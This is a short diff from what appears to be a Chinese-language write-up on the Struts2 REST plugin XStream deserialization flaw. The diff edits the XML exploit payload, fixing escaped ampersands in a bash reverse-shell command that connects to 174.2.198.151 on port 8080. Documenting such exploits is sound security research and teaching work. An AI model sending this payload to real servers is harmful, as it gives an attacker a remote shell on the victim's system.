@@ -239,7 +239,7 @@ REST 插件用 XStream 处理 application/xml 的数据包，在反序列化 XML
                       <command>
                         <string>bash</string>
                         <string>-c</string>
-                        <string>bash -i >&amp; /dev/tcp/174.2.198.151/8080 0>&amp;1</string>
+                        <string>bash -i >& /dev/tcp/174.2.198.151/8080 0>&1</string>
                       </command>
                       <redirectErrorStream>false</redirectErrorStream>
                     </next>
